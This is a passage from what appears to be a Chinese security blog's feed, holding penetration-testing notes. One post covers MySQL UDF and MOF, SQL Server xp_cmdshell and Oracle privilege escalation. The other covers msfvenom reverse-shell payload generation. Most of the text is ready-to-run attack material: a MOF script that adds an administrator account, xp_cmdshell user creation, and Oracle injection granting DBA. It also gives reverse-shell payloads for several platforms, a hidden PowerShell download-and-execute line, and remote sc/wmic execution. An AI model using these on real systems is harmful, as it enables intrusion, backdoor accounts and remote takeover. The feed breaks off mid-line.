Version&gt;5.7)遇到的一些问题：</strong></p><ul><li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p><ul><li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li></ul><pre><code>secure_file_priv=&quot;&quot;</code></pre><pre><code> 将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li><li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p></li><li><p>mysql.user下password列更改为authentication_string列。</p></li></ul><h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p><p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p><p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p><p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p><p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p><p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p><p>还可以执行数据库命令：</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p><p>这里补充一个点:</p><ul><li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li><li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li></ul><p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p><p>用NTFS ADS流模式突破进而创建文件夹</p><pre><code>select @@basedir;  //查找到mysql的目录select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建lib目录select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建plugin目录</code></pre><p>我直接在菜刀下创建plugin文件夹</p><p>然后最关键的一步：<strong>导出UDF文件</strong></p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p><p>导出后，再次尝试文件已经存在，说明导入成功。</p><p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p><p>引入sys_eval函数：</p><pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;moonudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p><p>之后使用命令模板即可执行命令：</p><pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>也可以直接使用大马这里的功能选项：</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p><h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p><p>进入模块，看一下需要配置选项：</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p><p>注：这里注意版本，适用于5.5.9以下，</p><h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p><pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p><h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p><p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p><p>文件内容：</p><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)instance of __EventFilter as $EventFilter{EventNamespace = &quot;Root\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;};instance of ActiveScriptEventConsumer as $Consumer{Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test test /add\&quot;)&quot;;};instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;};</code></pre><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p><p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p><pre><code>select load_file(&quot;C:/phpStudy/WWW/nullevt.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>可以使用菜刀下的数据库管理工具执行</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p><p>执行后，到win2003上查看用户：</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p><p>之后我们可以将自定义的命令改为：</p><pre><code>net.exe localgroup administrators test /add</code></pre><p>即可对添加的用户进行提权。</p><h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p><h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p><p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p><h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p><ul><li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li><li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li><li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li></ul><h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p><p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p><ul><li>getshell或者存在sql注入并且能够执行命令</li><li>sql server是system权限，sql server默认就是system权限。</li><li>获取SA用户口令</li></ul><h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul><li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li></ul><pre><code>conn.aspxconfig.aspxconfig.phpweb.config.........一般格式如：server=localhost;UID=sa;PWD=shadowflow</code></pre><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p><p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p><h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</code></pre><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><pre><code>exec master..xp_cmdshell &#39;net user test pinohd123. /add&#39;    添加用户test，密码testexec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添加test用户到管理员组</code></pre><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li><li>用户拥有<code>create procedure</code>权限（用来创建函数）</li></ul><h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul><li>用户登陆后执行<code>select * from session_privs</code>查看权限</li><li>创建函数，命令为<code>grant dba to quan</code></li></ul><p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p><pre><code>SQL&gt;create or replace function pwn return vaarchar2authid current_user is pragma autonomous_transaction;beginexecute immediate &#39;grant dba to quan&#39;;return &#39;&#39;;end;/SQL&gt;grant execute on pwn to public;/</code></pre><p>注入sys.dbms_cdc_subscribe.activate_subscription</p><pre><code>SQL&gt;beginsys.dbms_cdc_subscribe.activate_subscription(&#39;&#39;&#39;||quan.pwn()||&#39;&#39;&#39;);end;/SQL&gt;set role dba;</code></pre><p>执行<code>select * from session_privs</code>查看是否为dba权限</p><h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p><pre><code>use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription</code></pre><p>2.配置参数</p><pre><code>set dbuser quanset dbpass quan123set sid orclset rhost xxxxxset sql grant dba to quan</code></pre><p>3.run</p><h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>UTL_HTTP存储过程可用</li><li>Oracle9i~11gR2</li></ul><h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol><li>创建Java包</li><li>创建存储过程MYJAVACMD</li><li>执行存储过程，成功添加用户</li></ol><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试中常见提权方式总结（一）&quot;&gt;&lt;a href=&quot;#渗透测试中常见提权方式总结（一）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试中常见提权方式总结（一）&quot;&gt;&lt;/a&gt;渗透测试中常见提权方式总结（一）&lt;/h2&gt;&lt;h3 id=&quot;数据库提权&quot;&gt;&lt;a
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>msf反弹payload学习</title>
    <link href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/</id>
    <published>2020-04-27T05:30:20.000Z</published>
    <updated>2020-04-28T03:48:15.435Z</updated>
    
    <content type="html"><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>   我们知道目前来说流行的shell主要有两种，一种是**正向shell(bind_shell)**一种是**反向shell(reverse_shell)**</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p><p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p><p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p><p>正向</p><p><img src="1208761-20190108155228561-656308830.png" alt=""></p><p>反向</p><p><img src="1208761-20190108140558839-392665606.png" alt=""></p><p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p><p><strong>下面列举了一些使用反向shell的情况：</strong></p><ul><li>目标机器在一个不同（相对攻击者而言）的私有网络</li><li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li><li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li><li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li></ul><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p><pre><code>Options:    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取        --payload-options            List the payload&#39;s standard options # 列出指定 Payload 的标准可选配置项    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式        --help-formats               List available formats # 列出所有可用的输出格式    -e, --encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder    -a, --arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构        --platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台        --help-platforms             List available platforms # 列出可用的平台    -s, --space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &#39;\x00\xff&#39; # 设置需要在 Payload 中避免出现的字符    -i, --iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板    -k, --keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行    -o, --out           &lt;path&gt;       Save the payload # 保存 Payload 到文件    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）        --smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload    -h, --help                       Show this message # 帮助</code></pre><p>我们可以通过命令列出可用的payloads、encoders、nops。</p><pre><code>msfvenom --list payloadsmsfvenom --list encodersmsfvenom --list nops</code></pre><p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p><h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt;LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p><p>攻击机:kali  192.168.153.176</p><p>靶机: win7   192.168.153.160</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.176 LPORT=5555 -f exe -o payload.exe</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p><p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p><pre><code>msfconsole    //启动msfuse exploit/multi/handler          //使用msf的侦听模块exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payloadset LHOST 192.168.153.176               //设置本地监听机Ipset LPORT  4444              //设置监听端口exploit </code></pre><p>执行完之后在Windows下执行payload.exe，然后结果如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p><p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p><ul><li>双击运行</li><li>cmd下运行exe</li><li>利用Powershell远程下载执行</li></ul><pre><code>powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http://127.0.0.1:8089&#39;,&#39;shell.exe&#39;);start-process shell.exe</code></pre><ul><li>利用at或schtasks设置计划任务执行</li></ul><pre><code>net use \\192.168.17.138\c$ &quot;admin123&quot; /user:pt007net usedir \\192.168.17.138\c$copy test.exe \\192.168.17.138\c$sc \\192.168.17.138 create test binpath= &quot;c:\test.exe&quot;sc \\192.168.17.138 start testsc \\192.168.17.138 del test</code></pre><ul><li>利用wmic远程命令执行</li></ul><pre><code>wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create &quot;cmd.exe /c ipconfig&gt;d:\result.txt&quot;</code></pre><h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f asp <span class="token operator">></span> shell<span class="token punctuation">.</span>asp</code></pre><h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>jsp</code></pre><h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f war <span class="token operator">></span> shell<span class="token punctuation">.</span>war</code></pre><h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">88.128</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>php</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p><p>在kali上使用msf执行下面的命令，监听端口4444：</p><pre class=" language-java"><code class="language-java">msfconsoleuse exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler set PAYLOAD php<span class="token operator">/</span>meterpreter_reverse_tcp set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span>set LPORT  <span class="token number">4444</span> exploit</code></pre><p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p><pre class=" language-java"><code class="language-java">php shell<span class="token punctuation">.</span>php</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p><h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p><p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre><h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>sh</code></pre><h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_perl LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>pl</code></pre><h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token 